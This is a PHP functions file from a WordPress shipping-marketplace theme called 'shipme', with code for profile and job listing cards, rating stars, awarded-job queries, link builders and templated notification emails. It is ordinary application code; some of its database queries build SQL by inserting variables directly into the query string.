      <a href=""><img src="<?php echo shipme_get_avatar_square($uid ); ?>" alt=""></a>
      <h4 class="profile-name"><?php echo shp_get_user_names($uid) ?></h4>

      <p class="rating-show"><span class="rating-stars"><?php echo shipme_get_ship_stars_new($uid) ?></span></p>

      <p class="mg-b-20"><?php

            $your_location = get_user_meta($uid,'your_location', true);
            if(empty($your_location)) echo __('Not defined yet','shipme');
            else echo $your_location;

      ?></p>
      <p class="mg-b-20"><?php $personal_info = get_user_meta($uid,'personal_info',true); if(empty($personal_info)) echo __('There is no profile bio defined.','shipme'); else echo substr($personal_info,0,180) . "..."; ?></p>

      <div class="row font-color-black user-table-1">

        <div class="d-flex row-user-crb">
          <div class="mr-auto p-2 bd-highlight"><?php printf(__('%s Registered On','shipme'), '<i class="fas fa-calendar-alt"></i>'); ?></div>
          <div class="p-2 bd-highlight"><?php


          $udata = get_userdata( $uid );
          $registered = $udata->user_registered;


          echo date( "M Y", strtotime( $registered ) )  ?></div>
        </div>

        <div class="d-flex row-user-crb">
          <div class="mr-auto p-2 bd-highlight"><?php printf(__('%s Inbox Messages','shipme'), '<i class="fas fa-envelope-open-text"></i>'); ?></div>
          <div class="p-2 bd-highlight"><?php echo sprintf(__('%s unread','shipme'), shipme_get_unread_number_messages(get_current_user_id())); ?></div>
        </div>

        <div class="d-flex row-user-crb">
          <div class="mr-auto p-2 bd-highlight"><?php printf(__('%s Balance','shipme'), '<i class="fas fa-wallet"></i>'); ?></div>
          <div class="p-2 bd-highlight"><?php

                  echo shipme_get_show_price(shipme_get_credits($uid), 2);

           ?></div>
        </div>


        <div class="d-flex row-user-crb">
          <div class="mr-auto p-2 bd-highlight"><?php printf(__('%s Jobs in progress','shipme'), '<i class="fas fa-box-open"></i>'); ?></div>
          <div class="p-2 bd-highlight"><?php echo shipme_get_nr_of_active(get_current_user_id()) ?></div>
        </div>


        <div class="d-flex row-user-crb">
          <div class="mr-auto p-2 bd-highlight"><?php printf(__('%s Live quotes','shipme'), '<i class="fas fa-business-time"></i>'); ?></div>
          <div class="p-2 bd-highlight"><?php echo shipme_show_nr_of_jobs_in_progress(get_current_user_id()) ?></div>
        </div>



          </div>

      <a href="<?php echo get_permalink(get_option('shipme_profile_settings_page_id')) ?>" class="btn btn-primary btn-block contact-user-btn"><?php _e('Edit Profile','shipme') ?></a>
        <a href="<?php echo shipme_get_user_profile_link(get_current_user_id()) ?>" class="btn btn-primary btn-block contact-user-btn"><?php _e('View Profile','shipme') ?></a>
    </div><!-- card-body -->
  </div>


  <?php

}


function shipme_show_nr_of_jobs_in_progress($uid)
{
  global $wpdb; $prefix = $wpdb->prefix;

  $s = "select distinct ID from   ".$prefix."posts posts,  ".$prefix."postmeta pmeta ,  ".$prefix."ship_bids bids
  where bids.uid='$uid' AND posts.post_status='publish' AND posts.post_type='job_ship' AND pmeta.meta_value='0' AND pmeta.meta_key='closed' and pmeta.post_id=posts.ID order by posts.ID desc";

  $r = $wpdb->get_results($s);

  return count($r);
}

/*======================================================
*
*	    function here
*
*======================================================*/

add_action( 'wp_enqueue_scripts', 'shp_themebs_enqueue_styles');

function shp_themebs_enqueue_styles()
{


          wp_enqueue_style( 'rubikfont', 'https://fonts.googleapis.com/css?family=Rubik:400,500&display=swap' );
          wp_enqueue_style( 'latofont', 'https://fonts.googleapis.com/css?family=Lato:400,700&display=swap' );
          wp_enqueue_style( 'ion', 'https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css' );
          wp_enqueue_style( 'bootstrap', 'https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css' );

          wp_enqueue_style( 'jqsteps', get_template_directory_uri() . '/css/jquery.steps.css' );
          wp_enqueue_style( 'core', get_template_directory_uri() . '/css/main.css' );
          wp_enqueue_style( 'core2', get_template_directory_uri() . '/style.css' );
          wp_enqueue_style( 'mobile-menu', get_template_directory_uri() . '/css/mobile-menu.css' );


          wp_enqueue_script('jquery');

          // Jquery ui core
          wp_enqueue_script( 'jquery-ui-datepicker' );

    // You need styling for the datepicker. For simplicity I've linked to the jQuery UI CSS on a CDN.
          wp_register_style( 'jquery-ui', 'https://code.jquery.com/ui/1.12.1/themes/smoothness/jquery-ui.css' );
          wp_enqueue_style( 'jquery-ui' );

}
/*======================================================
*
*	    function here
*
*======================================================*/

 function shp_themebs_enqueue_scripts() {

   wp_enqueue_script( 'fontawesome', 'https://use.fontawesome.com/b1aac1e7b9.js', array( 'jquery' ) );
     wp_enqueue_style( 'font-awesome', 'https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css' );
       wp_enqueue_style( 'material-awesome', 'https://fonts.googleapis.com/icon?family=Material+Icons' );

   wp_enqueue_script( 'bootstrap', 'https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.bundle.min.js', array( 'jquery' ) );
   wp_enqueue_script( 'scripts', get_template_directory_uri() . '/js/scripts.js', array( 'jquery' ) );

 }
 add_action( 'wp_enqueue_scripts', 'shp_themebs_enqueue_scripts');

 /*======================================================
 *
 *	    function here
 *
 *======================================================*/

 function shipme_get_my_awarded_projects2($uid)
 {
 	$c = "<select name='projectss'><option value=''>".__('Select','shipme')."</option>";
 	global $wpdb;

 	$querystr = "
 					SELECT distinct wposts.*
 					FROM $wpdb->posts wposts, $wpdb->postmeta wpostmeta
 					WHERE wposts.post_author='$uid'
 					AND  wposts.ID = wpostmeta.post_id
 					AND wpostmeta.meta_key = 'closed'
 					AND wpostmeta.meta_value = '1'
 					AND wposts.post_status = 'publish'
 					AND wposts.post_type = 'job_ship'
 					ORDER BY wposts.post_date DESC";

 	//echo $querystr;
 	$r = $wpdb->get_results($querystr);
 	$winners_arr = array();

 	foreach($r as $row)
 	{
 		$pid = $row->ID;
 		$winner = get_post_meta($pid, "winner", true);


 		if(!empty($winner))
 		{


 			if(shipme_check_agains_vl_vl_arr($winners_arr,$winner) == false)
 			{

 				$winners_arr[] = $winner;
 				$user = get_userdata($winner);
 				$c .= '<option value="'.$winner.'">'.$user->user_login.'</option>';
 				$i = 1;
 			}
 		}
 	}


 	//-------------------------------

 	if($i == 1)
 	return $c.'</select>';

 	return false;
 }





/*======================================================
*
*	    function here
*
*======================================================*/

  function shipme_get_my_awarded_projects($uid)
 {
 	$c = "<select name='projectss' onchange='on_proj_sel();' id='my_proj_sel'><option value='0'>".__('Select','shipme')."</option>";
 	global $wpdb;

 	$querystr = "
 					SELECT distinct wposts.*
 					FROM $wpdb->posts wposts, $wpdb->postmeta wpostmeta
 					WHERE wposts.post_author='$uid'
 					AND  wposts.ID = wpostmeta.post_id
 					AND wpostmeta.meta_key = 'closed'
 					AND wpostmeta.meta_value = '1'
 					AND wposts.post_status = 'publish'
 					AND wposts.post_type = 'job_ship'
 					ORDER BY wposts.post_date DESC";

 	//echo $querystr;
 	$r = $wpdb->get_results($querystr);

 	foreach($r as $row)
 	{
 		$pid = $row->ID;
 		$winner = get_post_meta($pid, "winner", true);


 		if(!empty($winner))
 		{
 			$c .= '<option value="'.$row->ID.'" '.($row->ID == $_GET['poid'] ? 'selected="selected"' : '').'>'.$row->post_title.'</option>';
 			$i = 1;
 		}
 	}

 	//----------------------------

 					 $querystr = "
 					SELECT distinct wposts.*
 					FROM $wpdb->posts wposts, $wpdb->postmeta wpostmeta
 					WHERE wposts.ID = wpostmeta.post_id
 					AND wpostmeta.meta_key = 'winner'
 					AND wpostmeta.meta_value = '$uid'
 					AND wposts.post_status = 'publish'
 					AND wposts.post_type = 'project'
 					ORDER BY wposts.post_date DESC ";



 	$r = $wpdb->get_results($querystr);

 	foreach($r as $row) // = mysql_fetch_object($r))
 	{
 		$pid = $row->ID;

 			$c .= '<option value="'.$row->ID.'">'.$row->post_title.'</option>';
 			$i = 1;

 	}

 	//-------------------------------

 	if($i == 1)
 	return $c.'</select>';

 	return false;
 }
 /*----------------------------------------------------
 *
 *
 *	function here
 *
 *-----------------------------------------------------*/
 function shipme_get_my_awarded_projects3($uid)
 {
 	$c = "<select name='projectss' id='my_proj_sel'><option value='0'>".__('Select','shipme')."</option>";
 	global $wpdb;

 	$querystr = "
 					SELECT distinct wposts.*
 					FROM $wpdb->posts wposts, $wpdb->postmeta wpostmeta  , $wpdb->postmeta wpostmeta2
 					WHERE wposts.post_author='$uid'
 					AND  wposts.ID = wpostmeta.post_id  and wposts.ID = wpostmeta2.post_id
 					AND wpostmeta.meta_key = 'closed'  AND wpostmeta2.meta_key = 'winner'
 					AND wpostmeta.meta_value = '1'  and wpostmeta2.meta_value != ' '
 					AND wposts.post_status = 'publish'
 					AND wposts.post_type = 'job_ship'
 					ORDER BY wposts.post_date DESC";

 	//echo $querystr;
 	$r = $wpdb->get_results($querystr);

 	foreach($r as $row)
 	{
 		$pid = $row->ID;
 		$winner = get_post_meta($pid, "winner", true);


 		if(!empty($winner))
 		{
 			$winner_usr = shipme_get_winner_bid($pid);
 			$winner_usr = get_userdata($winner_usr->uid);
 			$c .= '<option value="'.$row->ID.'">'.$row->post_title.' - '.$winner_usr->user_login.'</option>';
 			$i = 1;
 		}
 	}

 	//----------------------------

 	if($i == 1)
 	return $c.'</select>';

 	return false;
 }

 function shipme_is_home()
 {
     global  $wp_query;
     $current_user = wp_get_current_user();
     $a_action 	=  $wp_query->query_vars['s_action'];

     if(!empty($a_action)) return false;
     if(is_home() or is_front_page()) return true;
     return false;

 }

 /*----------------------------------------------------
 *
 *
 *	function here
 *
 *-----------------------------------------------------*/
  function shipme_sanitize_string($ss)
  {

     $ss = esc_sql($ss);
   	return $ss;
  }
  /*****************************************************************************
  *
  *	Function - shipme -
  *
  *****************************************************************************/

  function shipme_get_regular_job_post_new_account_new_widget($class_optional = '')
  {

    $featured = get_post_meta(get_the_ID(),'featured',  true);


      ?>

      <article class="card card-product-list">
	<div class="row no-gutters">
		<aside class="col-md-3 aside-thing">
			<a href="#" class="img-wrap">
        <?php if($featured == "1") { ?>	<span class="my-badge-featured badge badge-danger"> <?php echo __('FEATURED','shipme') ?> </span> <?php } ?>

				<img src="<?php echo shipme_get_first_post_image(get_the_ID(),100,100) ?>" width="100" alt="<?php the_title() ?>" />
			</a>
		</aside> <!-- col.// -->
		<div class="col-md-6">
			<div class="info-main info-main-small">
				<a href="<?php the_permalink() ?>" class="h5 title" title="<?php the_title() ?>"><?php the_title() ?></a>
				<div class="rating-wrap mb-3">
              <?php echo sprintf(__('Posted on %s','shipme'), get_the_time('d/M/Y')) ?>
				</div> <!-- rating-wrap.// -->

				<p class="locations-post-card"> <i class="fas fa-location-arrow"></i> <?php echo sprintf(__("From: <b>%s</b>", 'shipme'), get_post_meta(get_the_ID(),'pickup_location',true)); ?> <br/>
          <i class="fas fa-location-arrow"></i> <?php echo sprintf(__("To: <b>%s</b>", 'shipme'), get_post_meta(get_the_ID(),'delivery_location',true)); ?>
         </p>
			</div> <!-- info-main.// -->
		</div> <!-- col.// -->
		<aside class="col-sm-3">
			<div class="info-aside">
				<div class="price-wrap">
					<span class="price h5"> <?php echo shipme_get_show_price(get_post_meta(get_the_ID(),'price',true), 0); ?> </span>

				</div> <!-- info-price-detail // -->

				<br>
				<p>
					<a href="<?php the_permalink() ?>" class="btn btn-primary btn-block"><?php _e('Post Proposal','shipme') ?></a>

				</p>
			</div> <!-- info-aside.// -->
		</aside> <!-- col.// -->
	</div> <!-- row.// -->
</article>

      <?php
  }


  /*****************************************************************************
  *
  *	Function - shipme -
  *
  *****************************************************************************/

  function shipme_get_regular_job_post_new_account_new($class_optional = '')
  {

    $featured = get_post_meta(get_the_ID(),'featured',  true);


      ?>

      <article class="card card-product-list">
	<div class="row no-gutters">
		<aside class="col-md-3 aside-thing">
			<a href="#" class="img-wrap">
			<?php

          if($featured == 1)
          {

      ?>	<span class="my-badge-featured badge badge-danger"> FEATURED </span> <?php } ?>
				<img src="<?php echo shipme_get_first_post_image(get_the_ID(),70,70) ?>">
			</a>
		</aside> <!-- col.// -->
		<div class="col-md-6">
			<div class="info-main">
				<a href="<?php the_permalink() ?>" class="h5 title" title="<?php the_title() ?>"><?php the_title() ?></a>
				<div class="rating-wrap mb-3">
              <?php echo sprintf(__('Posted on %s','shipme'), get_the_time('d/M/Y')) ?>
				</div> <!-- rating-wrap.// -->

				<p class="locations-post-card"> <i class="fas fa-location-arrow"></i> <?php echo sprintf(__("From: <b>%s</b>", 'shipme'), get_post_meta(get_the_ID(),'pickup_location',true)); ?> <br/>
          <i class="fas fa-location-arrow"></i> <?php echo sprintf(__("To: <b>%s</b>", 'shipme'), get_post_meta(get_the_ID(),'delivery_location',true)); ?>
         </p>
			</div> <!-- info-main.// -->
		</div> <!-- col.// -->
		<aside class="col-sm-3">
			<div class="info-aside">
				<div class="price-wrap">
					<span class="price h5"> <?php echo shipme_get_show_price(get_post_meta(get_the_ID(),'price',true), 0); ?> </span>

				</div> <!-- info-price-detail // -->

				<br>
				<p>
					<a href="<?php the_permalink() ?>" class="btn btn-primary btn-block"><?php _e('Post Proposal','shipme') ?></a>
					<a href="#" class="btn btn-light btn-block"><i class="fa fa-heart"></i>
						<span class="text">Add to wishlist</span>
					</a>
				</p>
			</div> <!-- info-aside.// -->
		</aside> <!-- col.// -->
	</div> <!-- row.// -->
</article>

      <?php
  }


  function shipme_get_regular_job_post_new_account($class_optional = '')
  {
  	$now = time();
  	$ending = get_post_meta(get_the_ID(),'ending',true);
  	$sec = $ending - $now;

  	?>
      	<div class="card mb-4 p-3 <?php echo $class_optional ?>" id="post-<?php the_ID() ?>">

  				<div class="row">
          	<div class="title-area col-xs-12 col-sm-12 col-lg-12">
          		<h6 class="main-title-post"><a href="<?php the_permalink() ?>" title="<?php the_title() ?>"><?php the_title() ?></a></h6>
              </div>

              <div class="picture-area col-xs-12 col-sm-2 col-lg-2">
              	<a href="<?php the_permalink() ?>"><img src="<?php echo shipme_get_first_post_image(get_the_ID(),70,70) ?>" class="img_img" width="70" /></a>
              </div>

              <div class="collection-del-area col-xs-12 col-sm-3 col-lg-3">
               	<?php echo (get_post_meta(get_the_ID(),'pickup_location',true)); ?>
               </div>


               <div class="collection-del-area col-xs-12 col-sm-3 col-lg-3">
               	<?php echo (get_post_meta(get_the_ID(),'delivery_location',true)); ?>
               </div>






               <div class="ending-area col-xs-12 col-sm-2 col-lg-2">
               	<?php echo shipme_secondsToTime($sec); ?>
               </div>


                <div class="button-area col-xs-12 col-sm-2 col-lg-2">
               	<a href="<?php the_permalink() ?>" class="btn btn-primary btn-sm"  ><i class="fa fa-check-circle"></i> <?php _e('View Details','shipme') ?></a>
               </div>



  						         </div>

<div class="row justify-content-end">


<div class="col-auto ">
 <div class="price-me"><h3> <?php echo shipme_get_show_price(get_post_meta(get_the_ID(),'price',true)); ?></h3> </div>
</div>

</div>


  										         </div>

      <?php
  }

  /*----------------------------------------------------
 *
 *
 *	function here
 *
 *-----------------------------------------------------*/
  function shipme_get_payments_page_url_redir($subpage = '', $szz = '')
 {
 	$opt = get_option('shipme_finances_page_id');
 	if(empty($subpage)) $subpage = "home";

 	$perm = shipme_using_permalinks();
 	$rdr = urlencode(PT_curPageURL());

 	if($perm) return get_permalink($opt). "?redir1=".$rdr."&pg=".$subpage.(!empty($id) ? "&id=".$id . $szz : $szz);

 	return get_permalink($opt). "&redir1=".$rdr."&pg=".$subpage.(!empty($id) ? "&id=".$id . $szz : $szz);
 }



 /*----------------------------------------------------
 *
 *
 *	function here
 *
 *-----------------------------------------------------*/
 function shipme_ship_get_star_rating($uid)
 {

 	global $wpdb;
 	$s = "select grade from ".$wpdb->prefix."ship_ratings where touser='$uid' AND awarded='1'";
 	$r = $wpdb->get_results($s);
 	$i = 0; $s = 0;

 	if(count($r) == 0)	return __('(No rating)','shipme');
 	else
 	foreach($r as $row) // = mysql_fetch_object($r))
 	{
 		$i++;
 		$s = $s + $row->grade;

 	}

 	$rating = round(($s/$i)/2, 0);
 	$rating2 = round(($s/$i)/2, 1);


 	return shipme_get_ship_stars($rating)." (".$rating2 ."/5) ". sprintf(__("on %s rating(s)","shipme"), $i);
 }
 /*----------------------------------------------------
 *
 *
 *	function here
 *
 *-----------------------------------------------------*/

 function shipme_get_ship_stars($rating)
 {
 	$full 	= '<i class="fas fa-star star-rating-view"></i>';
 	$empty 	= '<i class="far fa-star star-rating-view"></i>';

 	$r = '';

 	for($j=1;$j<=$rating;$j++)
 	$r .=  $full ;


 	for($j=5;$j>$rating;$j--)
 	$r .=  $empty ;

 	return $r;

 }

 function shipme_get_ship_stars_new($uid)
 {

   global $wpdb;
   $s = "select grade from ".$wpdb->prefix."ship_ratings where touser='$uid' AND awarded='1'";
   $r = $wpdb->get_results($s);
   $i = 0; $s = 0;

   $cnt = count($r);

   if($cnt == 0)	return __('(No rating)','shipme');
   else
   foreach($r as $row) // = mysql_fetch_object($r))
   {
     $i++;
     $s = $s + $row->grade;

   }

   $rating = round(($s/$i)/2, 0);
   $rating2 = round(($s/$i)/2, 1);


   return shipme_get_ship_stars($rating) . "<span style='color:#222'>(".$cnt.")</span>";
 }


 /*----------------------------------------------------
 *
 *
 *	function here
 *
 *-----------------------------------------------------*/

 function shipme_get_user_feedback_link($uid)
 {
 	return get_bloginfo('url'). '/?p_action=user_feedback&driver_author='. $uid;
 }

 /*----------------------------------------------------
 *
 *
 *	function here
 *
 *-----------------------------------------------------*/

function shipme_get_user_table_row($uid)
 {
 	$author_info = get_userdata($uid);

 	?>




  <div class="card profile-header">
                  <div class="body">
                      <div class="row">
                          <div class="col-lg-3 col-md-3 col-12">
                              <div class="profile-image float-md-right"> <img src="<?php echo shipme_get_avatar($uid,95, 95) ?>" alt=""> </div>
                          </div>
                          <div class="col-lg-9 col-md-9 col-12">
                            <a href="<?php echo shipme_get_user_profile_link($uid) ?>"><h4 class="m-t-0 m-b-0"><strong><?php echo $author_info->user_login ?></strong></h4></a>

                              <span class="rating-stars"><?php echo shipme_get_ship_stars_new($author_info->ID) ?></span>

                              <p>     <?php

                             $user_description = get_user_meta($uid,'personal_info',true);
                             $user_description = strip_tags($user_description);

                             if(empty($user_description)) _e('This user doesnt have a description.','shipme');
                             else
                             {
                               echo substr($user_description,0,270);
                             }

                           ?></p>
                              <div>
                                  <a href="<?php echo shipme_get_user_profile_link($uid)  ?>"  class="btn btn-primary btn-round"><?php _e('View Profile','shipme'); ?></a>
                                  <a href="<?php echo shipme_get_priv_mess_page_url('send', '', '&uid='.$uid.'&pid='); ?>"  class="btn btn-primary btn-round"><?php _e('Contact User','shipme'); ?></a>

                              </div>

                          </div>
                      </div></div></div>


 	<?php
 }

 function shipme_get_user_profile_link($uid)
 {
 	if(shipme_using_permalinks() == true)
 	{
 		$user_login = get_userdata($uid);
 		return get_site_url(). '/user-profile/'. urlencode($user_login->user_login);
 	}
 	else return get_site_url(). '/?s_action=user_profile&driver_author='. $uid;
 }


 function shipme_get_pay_commission_link($id)
 {
 	if(shipme_using_permalinks() == true)
 	{
 		$user_login = get_userdata($uid);
 		return get_permalink(get_option('shipme_pay_commission_id')). '?payment_id='. $id;
 	}
 	else return get_permalink(get_option('shipme_pay_commission_id')). '&payment_id='. $id;
 }


 function shipme_see_if_project_files_bid($pid, $uid)
 {

 	$args = array(
 	'order'          => 'ASC',
 	'post_type'      => 'attachment',
 	'post_parent'    => $pid,
 	'post_author'    => $uid,
 	'meta_key'		 => 'is_bidding_file',
 	'meta_value'	 => '1',
 	'numberposts'    => -1,
 	'post_status'    => null,
 	);
 	$attachments = get_posts($args);



 	if ($attachments) {

 		 foreach ($attachments as $attachment) {


 			if($attachment->post_author == $uid){

 				return true;
 			}

 	}

 	}


 	 return false;

 }



 /*----------------------------------------------------
 *
 *
 *	function here
 *
 *-----------------------------------------------------*/

 function shipme_send_email_on_completed_job_to_owner($pid) // owner = post->post_author
 {
 	$enable 	= get_option('shipme_completed_job_owner_email_enable');
 	$subject 	= get_option('shipme_completed_job_owner_email_subject');
 	$message 	= get_option('shipme_completed_job_owner_email_message');

 	if($enable != "no"):

 		$post 			= get_post($pid);
 		$user 			= get_userdata($post->post_author);
 		$site_login_url = shipme_login_url();
 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));


 		$find 		= array('##username##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##job_name##', '##job_link##');
    		$replace 	= array($user->user_login, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $post->post_title, get_permalink($pid));

 		$tag		= 'shipme_send_email_on_completed_job_to_owner';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );

 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		//---------------------------------------------

 		shipme_send_email($user->user_email, $subject, $message);

 	endif;
 }
 /*----------------------------------------------------
 *
 *
 *	function here
 *
 *-----------------------------------------------------*/


 function shipme_send_email_on_job_completed_to_owner($pid) // owner = post->post_author
 {
  $enable 	  = get_option('shipme_completed_job_owner_email_enable');
  $subject 	= get_option('shipme_completed_job_owner_email_subject');
  $message 	= get_option('shipme_completed_job_owner_email_message');

  if($enable != "no"):


    $post 			= get_post($pid);
    $user 			= get_userdata($post->post_author);
    $site_login_url = shipme_login_url();
    $site_name 		= get_bloginfo('name');
    $account_url 	= get_permalink(get_option('shipme_my_account_page_id'));


    $find 		= array('##username##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##job_name##', '##job_link##' );
        $replace 	= array($user->user_login, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $post->post_title, get_permalink($pid) );

    $tag		= 'shipme_send_email_on_completed_job_to_owner';
    $find 		= apply_filters( $tag . '_find', 	$find );
    $replace 	= apply_filters( $tag . '_replace', $replace );

    $message 	= shipme_replace_stuff_for_me($find, $replace, $message);
    $subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

    //---------------------------------------------

    shipme_send_email($user->user_email, $subject, $message);

  endif;
 }


function shipme_send_email_on_job_completed_to_bidder($pid, $bidder) // owner = post->post_author
{
 $enable 	  = get_option('shipme_completed_job_bidder_email_enable');
 $subject 	= get_option('shipme_completed_job_bidder_email_subject');
 $message 	= get_option('shipme_completed_job_bidder_email_message');

 if($enable != "no"):


   $post 			= get_post($pid);
   $user 			= get_userdata($bidder);
   $site_login_url = shipme_login_url();
   $site_name 		= get_bloginfo('name');
   $account_url 	= get_permalink(get_option('shipme_my_account_page_id'));


   $find 		= array('##username##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##job_name##', '##job_link##' );
       $replace 	= array($user->user_login, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $post->post_title, get_permalink($pid) );

   $tag		= 'shipme_send_email_on_completed_job_to_owner';
   $find 		= apply_filters( $tag . '_find', 	$find );
   $replace 	= apply_filters( $tag . '_replace', $replace );

   $message 	= shipme_replace_stuff_for_me($find, $replace, $message);
   $subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

   //---------------------------------------------

   shipme_send_email($user->user_email, $subject, $message);

 endif;
}


//--------

 function shipme_send_email_on_escrow_job_to_owner($pid, $es) // owner = post->post_author
 {
 	$enable 	= get_option('shipme_escrow_job_owner_email_enable');
 	$subject 	= get_option('shipme_escrow_job_owner_email_subject');
 	$message 	= get_option('shipme_escrow_job_owner_email_message');

 	if($enable != "no"):

 		$es = shipme_get_show_price($es);
 		$post 			= get_post($pid);
 		$user 			= get_userdata($post->post_author);
 		$site_login_url = shipme_login_url();
 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));


 		$find 		= array('##username##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##job_name##', '##job_link##','##escrow_amount##');
    		$replace 	= array($user->user_login, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $post->post_title, get_permalink($pid), $es);

 		$tag		= 'shipme_send_email_on_completed_job_to_owner';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );

 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		//---------------------------------------------

 		shipme_send_email($user->user_email, $subject, $message);

 	endif;
 }
 /*----------------------------------------------------
 *
 *
 *	function here
 *
 *-----------------------------------------------------*/
 function shipme_send_email_on_delivered_job_to_bidder($pid, $bidder_id)
 {
 	$enable 	= get_option('shipme_delivered_job_bidder_email_enable');
 	$subject 	= get_option('shipme_delivered_job_bidder_email_subject');
 	$message 	= get_option('shipme_delivered_job_bidder_email_message');

 	if($enable != "no"):

 		$post 			= get_post($pid);
 		$user 			= get_userdata($bidder_id);
 		$site_login_url = shipme_login_url();
 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));


 		$find 		= array('##username##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##job_name##', '##job_link##');
    		$replace 	= array($user->user_login, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $post->post_title, get_permalink($pid));

 		$tag		= 'shipme_send_email_on_delivered_job_to_bidder';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );

 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		//---------------------------------------------

 		$email = get_bloginfo('admin_email');
 		shipme_send_email($user->user_email, $subject, $message);

 	endif;
 }
 /*----------------------------------------------------
 *
 *
 *	function here
 *
 *-----------------------------------------------------*/






 function shipme_send_email_on_delivered_job_to_owner($pid) // owner = post->post_author
 {
 	$enable 	= get_option('shipme_delivered_job_owner_email_enable');
 	$subject 	= get_option('shipme_delivered_job_owner_email_subject');
 	$message 	= get_option('shipme_delivered_job_owner_email_message');

 	if($enable != "no"):

 		$post 			= get_post($pid);
 		$user 			= get_userdata($post->post_author);
 		$site_login_url = shipme_login_url();
 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));


 		$find 		= array('##username##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##job_name##', '##job_link##');
    		$replace 	= array($user->user_login, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $post->post_title, get_permalink($pid));

 		$tag		= 'shipme_send_email_on_completed_job_to_owner';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );

 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		//---------------------------------------------

 		shipme_send_email($user->user_email, $subject, $message);

 	endif;
 }

 /*----------------------------------------------------
 *
 *
 *	function here
 *
 *-----------------------------------------------------*/
 function shipme_send_email_on_message_board_owner($pid, $owner_id, $sender_id)
 {
 	$enable 	= get_option('shipme_message_board_owner_email_enable');
 	$subject 	= get_option('shipme_message_board_owner_email_subject');
 	$message 	= get_option('shipme_message_board_owner_email_message');

 	if($enable != "no"):

 		$owner_id 			= get_userdata($owner_id);
 		$sender_id			= get_userdata($sender_id);


 		$site_login_url = shipme_login_url();
 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));
 		$job 		= get_post($pid);

 		$find 		= array('##username##', '##message_owner_username##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##','##job_name##','##job_link##');
    		$replace 	= array($owner_id->user_login, $sender_id->user_login, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $job->post_title, get_permalink($pid));

 		$tag		= 'shipme_send_email_on_message_board_owner';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );

 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		//---------------------------------------------

 		shipme_send_email($owner_id->user_email, $subject, $message);

 	endif;
 }


 function shipme_send_email_on_message_board_bidder($pid, $owner_id, $sender_id)

 {
 	$enable 	= get_option('shipme_message_board_bidder_email_enable');
 	$subject 	= get_option('shipme_message_board_bidder_email_subject');
 	$message 	= get_option('shipme_message_board_bidder_email_message');

 	if($enable != "no"):

 		$owner_id 			= get_userdata($owner_id);
 		$sender_id			= get_userdata($sender_id);


 		$site_login_url = shipme_login_url();
 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));
 		$job = get_post($pid);

 		$find 		= array('##job_username##', '##username##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##','##job_name##','##job_link##');
    		$replace 	= array($owner_id->user_login, $sender_id->user_login, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $job->post_title, get_permalink($pid));

 		$tag		= 'shipme_send_email_on_message_board_bidder';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );

 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		//---------------------------------------------

 		shipme_send_email($sender_id->user_email, $subject, $message);

 	endif;
 }

 /*************************************************************
 *
 *	shipme (c) sitemile.com - function
 *
 **************************************************************/


 function shipme_send_email_on_priv_mess_received($sender_uid, $receiver_uid)
 {
 	$enable 	= get_option('shipme_priv_mess_received_email_enable');
 	$subject 	= get_option('shipme_priv_mess_received_email_subject');
 	$message 	= get_option('shipme_priv_mess_received_email_message');

 	if($enable != "no"):

 		$user 			= get_userdata($receiver_uid);
 		$site_login_url = shipme_login_url();
